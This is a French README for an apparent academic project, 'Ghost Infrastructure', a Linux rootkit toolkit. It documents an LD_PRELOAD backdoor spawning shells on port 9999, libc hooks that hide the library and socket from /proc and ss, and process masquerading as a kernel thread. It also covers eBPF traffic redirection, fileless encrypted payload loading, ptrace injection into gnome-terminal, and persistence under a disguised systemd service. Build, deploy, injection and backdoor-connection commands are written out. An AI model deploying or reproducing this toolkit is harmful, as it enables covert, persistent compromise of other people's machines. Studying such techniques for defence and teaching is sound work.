# Ghost Infrastructure — Projet Cybersécurité 42

> **Contexte académique** : Projet de spécialisation cybersécurité (post-tronc commun).  
> Ces outils implémentent des techniques offensives avancées à des fins pédagogiques : persistence, furtivité, injection mémoire, filtrage réseau via eBPF.

---

## Vue d'ensemble de l'architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                     GHOST INFRASTRUCTURE                        │
├─────────────────────────────────────────────────────────────────┤
│  Payload Layer                                                  │
│  ├── encrypt_payload.py (AES-256-GCM)                         │
│  ├── stager.py (fileless decryption + dlopen)                │
│  └── evador.c (memfd-based loader)                            │
├─────────────────────────────────────────────────────────────────┤
│  Injection Layer                                               │
│  ├── ghost_lib.c (light version, target detection)           │
│  ├── hijack.so (full rootkit with hooks)                     │
│  └── injector.c (ptrace-based remote injection)              │
├─────────────────────────────────────────────────────────────────┤
│  Persistence Layer                                             │
│  ├── survival.sh (double-fork daemon)                        │
│  ├── master_deploy.sh (full infrastructure)                   │
│  └── systemd service (user-level persistence)                 │
├─────────────────────────────────────────────────────────────────┤
│  BPF Layer (Advanced)                                          │
│  ├── ghost.bpf.c (sk_lookup redirection)                     │
│  ├── loader.c (BPF loader + FD transfer)                      │
│  └── receiver.c (ghost socket receiver)                       │
└─────────────────────────────────────────────────────────────────┘
```

---

## Fichiers du projet

| Fichier | Type | Rôle |
|---------|------|------|
| `config.h` | Header C | Configuration centralisée (ports, paths, constantes) |
| `ghost_lib.c` | Bibliothèque C | Version légère avec détection de cible |
| `hijack.so` | Bibliothèque C | Full rootkit avec tous les hooks libc |
| `ghost.bpf.c` | eBPF | Redirection de trafic au niveau kernel |
| `loader.c` | C | Chargeur eBPF + transfert de FD via socket Unix |
| `receiver.c` | C | Récepteur du socket fantôme (mode ghost) |
| `evador.c` | C | Chargement .so en mémoire via `memfd_create` |
| `injector.c` | C | Injection ptrace dans processus distant |
| `encrypt_payload.py` | Python | Chiffrement AES-256-GCM du payload |
| `stager.py` | Python | Déchiffrement et exécution fileless en RAM |
| `ghost_deploy.sh` | Bash | Déploiement via injection LD_PRELOAD |
| `ghost_swap.sh` | Bash | Injection chirurgicale sur `gnome-terminal-server` |
| `survival.sh` | Bash | Daemon de survie (double-fork + résistance SIGTERM) |
| `master_deploy.sh` | Bash | Déploiement complet de l'infrastructure |
| `full.sh` | Bash | Script de nettoyage global |

---

## Techniques implémentées

### 1. Backdoor via LD_PRELOAD (`ghost_lib.c`, `hijack.so`)
- Injection d'une shared library dans un processus cible (`gnome-terminal-server`)
- Listener TCP sur le port 9999, spawn d'un shell interactif sur connexion
- Masquage du process via `prctl(PR_SET_NAME, "[kworker/u24:5]")`
- **Kill switch** : détection du fichier `/tmp/.ghost_off` pour auto-extinction
- Détection du processus cible via `/proc/self/exe`

### 2. Rootkit userland (hooks libc dans `hijack.so`)
- Hook `open()` / `openat()` → filtrage `/proc/self/maps` et `/proc/self/environ`
- Hook `readdir()` → masquage du file descriptor du socket
- Hook `recvmsg()` → filtrage des réponses Netlink (`ss` ne voit pas port 9999)
- Hook `bind()` → force `SO_REUSEADDR/SO_REUSEPORT` sur tous les sockets
- Support `openat()` avec chemins relatifs (`openat(proc_fd, "maps")`)
- Garde O_PATH pour éviter comportement indéfini

### 3. Filtrage /proc avancé
- `/proc/self/maps` : masque les lignes contenant `libghost` et `/tmp/*.so`
- `/proc/self/environ` : filtre `LD_PRELOAD=`
- Crée des memfd anonymes via `memfd_create()` (zéro artefact disque)

### 4. Redirection réseau eBPF (`ghost.bpf.c` + `loader.c` + `receiver.c`)
- Programme `sk_lookup` attaché au namespace réseau
- Redirection forcée des paquets port 9999 vers socket fantôme
- Transfert FD via `SCM_RIGHTS` (socket Unix)

### 5. Exécution fileless (`evador.c`, `stager.py`)
- Fichier en RAM via `memfd_create()` (syscall 319)
- Chargement via `/proc/self/fd/<fd>` sans contact disque
- Payload chiffré déchiffré en RAM

### 6. Chiffrement (`encrypt_payload.py`)
- AES-256-GCM via `cryptography.hazmat`
- Nonce 12 octets + auth tag GCM

### 7. Persistance (`survival.sh`, `master_deploy.sh`)
- Double-fork + `setsid()` + ignorance SIGHUP/SIGTERM
- Persistance systemd user via `portal-service.service`
- Workspaces redondants (`/var/tmp`, `/tmp`) avec pièges `-i`

### 8. Injection ptrace (`injector.c`)
- `PTRACE_ATTACH` + attente `SIGTRAP` via breakpoint `int3`
- Lecture résultat `dlopen` depuis RAX
- Sauvegarde/restauration registres et mémoire

---

## Configuration centralisée (`config.h`)

```c
#define GHOST_PORT          9999
#define SURVIVAL_PORT       8888
#define KILL_SWITCH         "/tmp/.ghost_off"
#define FAKE_THREAD_NAME    "[kworker/u24:5]"
#define UNIX_BRIDGE        "ghost_bridge"
#define BPF_OBJ_PATH        "ghost.bpf.o"
#define GHOST_SO_NAME       "libghost"

#define TARGET_COMM_1       "gnome-terminal"
#define TARGET_COMM_2       "zsh"
```

---

## Compilation

```bash
# Build complet
make all

# Build individuel
make hijack.so          # Full rootkit
make ghost_lib.so       # Version légère
make evador             # Loader fileless
make injector           # Injection ptrace
make receiver           # Récepteur BPF
make ghost.bpf.o        # Programme eBPF (requiert clang)
make loader             # Loader BPF (requiert libbpf)

# Setup libbpf (une fois)
make setup-libbpf

# Nettoyage
make clean
```

---

## Utilisation

### Déploiement standard

```bash
# Déploiement minimal (LD_PRELOAD uniquement)
./ghost_deploy.sh start
./ghost_swap.sh

# Vérification
./ghost_deploy.sh check

# Nettoyage minimal
./ghost_deploy.sh stop
```

### Persistence avancées

```bash
# Survie au logout (double-fork daemon)
./survival.sh start
./survival.sh stop

# Déploiement complet infrastructure
./master_deploy.sh

# Nettoyage total
./full.sh
touch /tmp/.ghost_off   # Kill switch
```

### Injection ptrace

```bash
# Compilation (si make non utilisé)
gcc -Wall -Wextra -o injector injector.c -ldl

# Injection dans processus distant
# Nécessite CAP_SYS_PTRACE ou root
./injector <pid> /chemin/vers/lib.so

# Exemple
./injector $(pgrep -f gnome-terminal) /tmp/libghost.so
```

### Connexion backdoor

```bash
# Shell interactif
nc localhost 9999

# Port secondaire (daemon survie)
nc localhost 8888
```

### Payload fileless

```bash
# Chiffrement
pip install cryptography
python3 encrypt_payload.py hijack.so

# Exécution fileless
python3 stager.py -p hijack.so.enc -k <cle_hex_a_32_caracteres>
```

---

## Corrections de sécurité (v5.2)

| Problème | Fichier | Correction |
|----------|---------|------------|
| Race condition post-unlock | `ghost_lib.c`, `hijack.c` | Pattern mutex→memfd→unlock→retour FD |
| Buffer overflow boucle copie | `ghost_lib.c`, `hijack.c` | Vérification `(dst-filtered)` dans boucle interne |
| usleep non déterministe | `injector.c` | Attente SIGTRAP via breakpoint int3 |
| Bypass openat chemin relatif | `ghost_lib.c`, `hijack.c` | Détection dirfd→/proc/<pid>/ via readlink |
| O_PATH non géré | `ghost_lib.c`, `hijack.c` | Garde early-return pour O_PATH |
| Fuite FD sur erreur | `ghost_lib.c`, `hijack.c` | Fermeture systématique dans create_filtered_memfd |
| Contention mutex | `ghost_lib.c`, `hijack.c` | Mutex séparés environ/maps |

---

## Prérequis

- Linux x86_64 (kernel ≥ 5.9 pour eBPF sk_lookup)
- `gcc`, `clang`, `libbpf`, `libelf`, `zlib`, `make`
- Python 3 + `cryptography` (`pip install cryptography`)
- `CAP_NET_ADMIN` pour eBPF
- `CAP_SYS_PTRACE` pour injection distante
- Environnement GNOME (cible `gnome-terminal-server`)

---

## Fonctionnement interne

### Hooks libc (`hijack.so`)

```
open("/proc/self/maps") → filter_maps_create_fd() → memfd_create() → return fd
open("/proc/self/environ") → filter_environ_create_fd() → memfd_create() → return fd
readdir() → skip entry if d_name == ghost_fd
recvmsg() → skip netlink if sport == 9999
bind() → setsockopt(SO_REUSEADDR|SO_REUSEPORT)
```

### Filtrage /proc avec mutex

```c
// Pattern sécurisé v5.2
pthread_mutex_lock(&maps_mutex);
// ... lecture /proc et filtrage ...
int fd = create_filtered_memfd(filtered, total);  // memfd SOUS mutex
pthread_mutex_unlock(&maps_mutex);
return fd;  // Retour FD, pas de pointeur buffer
```

### Injection ptrace

```
1. PTRACE_ATTACH → waitpid(WIFSTOPPED)
2. GETREGS → sauvegarde
3. POKEDATA chemin → inject_path()
4. POKETEXT int3 breakpoint → breakpoint地址
5. SETREGS (RIP=dlopen, RDI=chemin, RSI=RTLD_LAZY)
6. CONT → attend SIGTRAP
7. waitpid() → lit RAX pour résultat dlopen
8. POKETEXT restaure octet original
9. SETREGS restauration + DETACH
```

---

## Avertissement

> Ces outils sont développés dans un cadre strictement académique (École 42 — spécialisation cybersécurité).  
> Leur utilisation en dehors d'un environnement de lab isolé ou sans autorisation explicite est illégale.

---

## Glossaire

| Terme | Définition |
|-------|------------|
| LD_PRELOAD | Mécanisme Linux pour intercepter appels libc |
| memfd | File descriptor en RAM (pas de fichier disque) |
| SCM_RIGHTS | Passage de file descriptors via socket Unix |
| sk_lookup | Hook eBPF pour interception trafic réseau |
| ASLR | Randomisation des adresses mémoire |
| RTLD_NEXT | Symbole "suivant" dans ordre libraries |
